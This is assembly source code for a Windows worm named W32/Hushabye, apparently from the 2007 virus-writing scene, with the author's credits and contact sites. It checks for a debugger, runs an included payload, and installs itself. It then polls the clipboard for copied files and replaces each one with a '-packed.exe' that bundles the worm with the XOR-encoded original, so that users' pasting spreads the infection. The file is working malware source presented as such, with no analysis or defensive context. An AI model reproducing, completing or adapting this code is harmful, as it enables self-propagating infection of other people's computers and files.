   ;W32/Hushabye
   ;Coded by Berniee(Fakedminded) end of 2007
   ;Description: This worm is simply do monitor Clipboard and add itself as packed copy
   ;             of last file in the clipboard structure.
   ;Notes      : Seems that AVers not threatened by this idea(Define it as Trojan)
   ;
   ;Contact thru:ass-koder.de.vu || eof-project.net
   ;
   .586
   .model flat,stdcall
   option casemap:none

   include \masm32\include\windows.inc
   include \masm32\include\user32.inc
   include \masm32\include\kernel32.inc
   include \masm32\include\shell32.inc
   include \masm32\include\advapi32.inc

   includelib \masm32\lib\kernel32.lib
   includelib \masm32\lib\user32.lib
   includelib \masm32\lib\shell32.lib
   includelib \masm32\lib\advapi32.lib




   .data
   extension       db "-packed.exe",0
   hexa            db "%x",0
   CopyRight       db "W32/Hushabye : Coded by FakedM!nded||07",0
   sebt            db "File has been Exracted",0

   .data?
   h_clp           dd ?
   buffer          db 1024 dup(?)
   buf_check       db 1024 dup(?)
   buf_fname       db 1024 dup(?)
   p_name          db 256 dup(?)
   v_mem           dd ?
   new_clp         dd ?
   clp_mem         dd ?
   v_name          dd ?
   f_handle        dd ?
   f_mem           dd ?
   f_size          dd ?
   v_size          dd ?
   bwr             dd ?
   clp_size        dd ?
   uni_str_sz      dd ?
   sec_no          dw ?
   optional_size   dw ?
   org_size        dd ?
   clp_offset      dd ?


   include run.inc
   include payload.inc

   .code

   chk_1:
       mov esi,offset ca$h
       call @f

       call edi
       or eax,eax
       jz @f
       ret

       @@:
       pop edi

       mov ecx,chk_size1
       repe cmpsb
       or ecx,ecx
       jz @f
       pop edx
       ret
       @@:
       ret
       chk1_sz = $-chk_1

   uni2asci: ;                                            Functions to convert uni to aci
       xor edx,edx
       @@:
       mov dl,byte ptr [esi]
       mov byte ptr [edi],dl
       inc edi
       add esi,2

       loop @b
       ret
   size_uni:;---------------------------------------|Size the unicode string
       xor ecx,ecx
       @@:
       add ecx,2
       cmp word ptr [esi],0
       jz @f
       add esi,2
       jmp @b
       @@:
       ret

   size_asci:;---------------------------------------|Size the asci string
       xor ecx,ecx
       @@:
       inc ecx
       cmp byte ptr [esi],0
       jz @f
       inc esi
       jmp @b
       @@:
       ret


   size_clp:
       mov ebp,esp
       add ebp,4
       xor ecx,ecx
       mov esi,eax
       add esi,20
       add ecx,20
       mov [ebp-40],esi
       sub dword ptr [ebp-40],2
       call @f
       @@:
       inc ecx
       cmp word ptr[esi],0
       jz @f
       inc esi
       jmp @b
       @@:
       mov edx,[esp]
       cmp word ptr [esi+3],0
       jnz @f
       pop edx
       mov esi,[ebp-40]
       add esi,2
       ret
       @@:
       mov [ebp-40],esi
       inc esi
       jmp edx

   str2uni: ;                                            Functions to convert uni to aci
       xor edx,edx
       @@:
       mov dl,byte ptr [esi]
       mov byte ptr [edi],dl
       mov byte ptr [edi+1],0

       add edi,2
       inc esi

       loop @b
       mov word ptr [edi],0

       ret

   add_clip:
       invoke lstrlen,offset buf_fname
       xor ecx,ecx
       xor edx,edx
       mov ecx,2
       mul ecx
       add eax,12
       add clp_size,eax
       push eax
       invoke RtlZeroMemory,offset buffer,1024
       mov edi,offset buffer
       mov esi,offset buf_fname
       pop ecx
       push ecx
       call str2uni
       invoke GlobalAlloc,0,clp_size
       mov new_clp,eax
       invoke RtlZeroMemory,new_clp,clp_size
       mov esi,clp_mem
       mov edi,new_clp
       mov ecx,clp_size
       pop edx
       push edx
       sub ecx,edx
       rep movsb
       mov edi,new_clp
       add edi,clp_offset;clp_size
       pop ecx
       push edi
       mov esi,offset buffer
       rep movsb
       pop edi
       call EmptyClipboard
       invoke SetClipboardData,CF_HDROP,new_clp
       invoke CloseHandle,h_clp
       ret

   chk_cargo:
       push esi
       invoke lstrlen,esi
       pop esi
       add esi,eax
       mov ecx,eax
       @@:
       cmp byte ptr[esi],"-"
       jz @f
       dec esi
       loop @b
       xor eax,eax
       ret
       @@:
       xor eax,eax
       dec eax
       ret

   or_size:
       invoke CreateFile,offset p_name,80000000h,0,0,3,0,0
       mov f_handle,eax
       invoke GetFileSize,eax,0
       mov f_size,eax
       invoke GlobalAlloc,0,eax
       mov f_mem,eax
       invoke ReadFile,f_handle,f_mem,f_size,offset bwr,0
       invoke CloseHandle,f_handle
       mov esi,f_mem
       add esi,[esi+3ch]
       mov cx,word ptr [esi+6]
       mov sec_no,cx
       xor ecx,ecx
       mov cx,word ptr [esi+20]
       mov optional_size,cx
       add esi,ecx
       add esi,24
       xor ecx,ecx
       mov cx,sec_no
       mov eax,40
       mul ecx
       add esi,eax
       sub esi,40
       mov eax,[esi+20]
       add eax,[esi+16]
       mov org_size,eax

       ret


   display_cargo:
       invoke RtlZeroMemory,offset buffer,1024
       invoke lstrcpy,offset buffer,offset p_name
       mov esi,offset buffer
       call chk_cargo
       or eax,eax
       jnz @f
       ret
       @@:
       mov dword ptr [esi],0
       mov eax,org_size
       sub f_size,eax

       mov esi,f_mem
       add esi,eax
       push esi
       mov v_mem,esi
       push f_size
       pop v_size
       call enc_v
       invoke CreateFile,offset buffer,40000000h,0,0,2,0,0
       pop esi
       push eax
       invoke WriteFile,eax,esi,f_size,offset bwr,0
       call CloseHandle
       invoke MessageBox,0,offset sebt ,offset CopyRight,0
       ret

   install:
       invoke lstrlen,offset p_name
       mov esi,offset p_name
       add esi,eax
       cmp dword ptr[esi-7],'.eyb'
       je @f
       call display_cargo
       call drop_inst
       invoke ExitProcess,0
       ret
       @@:
       call drop_inst
       ret

   set_F:
       mov edi,IsDebuggerPresent
       ret


   st_dir:

       push eax
       invoke GlobalAlloc,0,1024
       pop edx
       push edx
       ;mov edi,eax
       ;mov esi,dword ptr[esp]
       push eax
       invoke lstrlen,edx
       mov esi,dword ptr[esp+4]
       mov edi,dword ptr[esp]
       mov ecx,eax
       rep movsb
       mov word ptr [edi],0
       pop esi
       push esi
       push eax
       invoke SetCurrentDirectory,esi
       pop edx
       pop esi
       or eax,eax
       jnz error_1
       push esi
       add esi,edx

       @@:
       dec esi
       cmp byte ptr[esi],"\"
       jne @b
       mov word ptr [esi],00h
       pop esi
       push esi
       invoke SetCurrentDirectory,esi
       pop esi
       pop edx
       xor eax,eax
       ret
       error_1:
       pop eax
       xor eax,eax
       dec eax
       ret

   enc_v:
       mov esi,v_mem
       mov ecx,v_size
       @@:
       xor byte ptr [esi],'X'
       inc esi
       loop @b
       ret




   start:

       call set_F
       ca$h:
       call edi
       or eax,eax
       jz @f
       ret
       chk_size1 =$ - offset  ca$h

       @@:
       call chk_1
       mov edi, @b
       cmp byte ptr [edi],0E8h
       je @f
       ret
       @@:
       cmp byte ptr [esi-1],0c3h
       je @f
       ret
       @@:

       call paytime
       assume fs:nothing
       mov eax,offset handle_err
       push eax
       push fs:[0]
       mov fs:[0],esp


       invoke RtlZeroMemory,offset buf_check,1024
       invoke GetModuleFileName,0,offset p_name,256
       call or_size
       call install

   ClpBrdSniff:
       invoke OpenClipboard,0
       mov h_clp,eax
       push CF_HDROP
       call GetClipboardData
       mov clp_mem,eax
       lea ecx,clp_mem
       or eax,eax
       jz sleep_dear
       call size_clp
       add ecx,3
       mov clp_size,ecx
       push esi
       sub esi,clp_mem
       mov clp_offset,esi
       pop esi
       push esi
       call size_uni
       mov uni_str_sz,ecx
       push ecx
       invoke GlobalAlloc,0,ecx
       pop ecx
       pop esi
       mov edi,eax
       push edi
       call uni2asci
       mov eax,dword ptr [esp]
       call st_dir
       pop v_name
       or eax,eax
       jnz sleep_dear

       invoke lstrlen,v_name
       mov ecx,11
       mov esi,offset extension
       mov edi,v_name
       add edi,eax
       sub edi,11
       repe cmpsb
       or ecx,ecx
       jz sleep_dear
       @@:
       invoke RtlZeroMemory,offset buf_check,1024
       invoke lstrcpy,offset buf_check, v_name
       invoke CreateFile, v_name,80000000h,0,0,3,0,0
       mov f_handle,eax
       invoke GetFileSize,eax,0
       mov v_size,eax
       invoke GlobalAlloc,0,eax
       mov v_mem,eax
       invoke ReadFile,f_handle,v_mem,v_size,offset bwr,0
       invoke CloseHandle,f_handle
       call enc_v
       invoke CreateFile,offset p_name,80000000h,0,0,3,0,0
       mov f_handle,eax
       invoke GetFileSize,eax,0
       mov f_size,eax
       invoke GlobalAlloc,0,org_size
       mov f_mem,eax
       invoke ReadFile,f_handle,f_mem,org_size,offset bwr,0
       invoke CloseHandle,f_handle
       mov esi,v_name
       push esi
       call size_asci
       pop esi
       add esi,ecx
       @@:
       cmp byte ptr[esi],"\"
       jz @f
       dec esi
       jmp @b
       @@:
       inc esi
       push esi
       invoke RtlZeroMemory,offset buffer,256
       pop esi

       invoke lstrcpy,offset buffer,esi
       invoke lstrcat,offset buffer,offset extension
       invoke CreateFile,offset buffer,40000000h,0,0,2,0,0
       push eax
       invoke WriteFile,eax,f_mem,org_size,offset bwr,0
       pop eax
       push eax
       invoke WriteFile,eax,v_mem,v_size,offset bwr,0
       call CloseHandle
       invoke RtlZeroMemory,offset buf_fname,1024
       invoke GetFullPathName,offset buffer,512,offset buf_fname,0

       call add_clip
       call CloseClipboard
       sleep_dear:
       invoke CloseHandle,h_clp
       call CloseClipboard
       invoke Sleep,1000
       jmp ClpBrdSniff
       @@:
       ret



   handle_err:
       mov eax,[esp+12]
       mov esp,[eax+184+12]
       pop fs:[0]
       pop edx
       invoke ExitProcess,0


   end start
